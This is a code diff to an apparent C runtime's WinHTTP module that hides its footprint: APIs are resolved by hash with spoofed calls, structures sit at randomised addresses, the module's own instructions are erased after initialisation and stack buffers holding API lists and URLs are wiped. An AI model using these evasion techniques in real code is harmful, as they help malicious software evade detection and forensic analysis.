@@ -20,16 +20,13 @@
 #define DEFAULT_SEND_TIMEOUT    (300 * 1000) // 5m
 #define DEFAULT_RECEIVE_TIMEOUT (300 * 1000) // 5m
 
-#ifdef RELEASE_MODE
-    #define CHUNK_SIZE 4096
-#else
+#ifdef SMALL_CHUNK_SIZE
     #define CHUNK_SIZE 64
+#else
+    #define CHUNK_SIZE 4096
 #endif
 
 typedef struct {
-    // store option
-    bool NotEraseInstruction;
-
     // store HashAPI with spoof call
     FindAPI_MA_t FindAPI_MA;
 
@@ -103,13 +100,11 @@ WinHTTP_M* InitWinHTTP(Context* context)
 {
     // set structure address
     uintptr addr = context->MainMemPage;
-    uintptr moduleAddr = addr + LAYOUT_WH_STRUCT + RandUintN(addr, 128);
-    uintptr methodAddr = addr + LAYOUT_WH_METHOD + RandUintN(addr, 128);
+    uintptr moduleAddr = addr + LAYOUT_WH_STRUCT + RandUintN(0, 128);
+    uintptr methodAddr = addr + LAYOUT_WH_METHOD + RandUintN(0, 128);
     // allocate module memory
     WinHTTP* module = (WinHTTP*)moduleAddr;
     mem_init(module, sizeof(WinHTTP));
-    // store options
-    module->NotEraseInstruction = context->NotEraseInstruction;
     // store HashAPI method
     module->FindAPI_MA = context->FindAPI_MA;
     // initialize module
@@ -192,7 +187,7 @@ static void eraseModuleMethod(Context* context)
     uintptr begin = (uintptr)(GetFuncAddr(&initModuleAPI));
     uintptr end   = (uintptr)(GetFuncAddr(&eraseModuleMethod));
     uintptr size  = end - begin;
-    RandBuffer((byte*)begin, (int64)size);
+    EraseInstruction((void*)begin, size);
 }
 
 __declspec(noinline)
@@ -349,6 +344,9 @@ static bool findWinHTTPAPI()
     module->WinHttpQueryDataAvailable = list[0x0A].proc;
     module->WinHttpReadData           = list[0x0B].proc;
     module->WinHttpCloseHandle        = list[0x0C].proc;
+
+    // erase data in the large stack
+    mem_init(list, sizeof(list));
     return true;
 }
 
@@ -746,6 +744,9 @@ exit_loop:
     module->free(path);
     module->free(extra);
     module->free(reqPath);
+
+    // erase data in the large stack
+    mem_init(&url_com, sizeof(url_com));
 
     if (!decreaseCounter())
     {
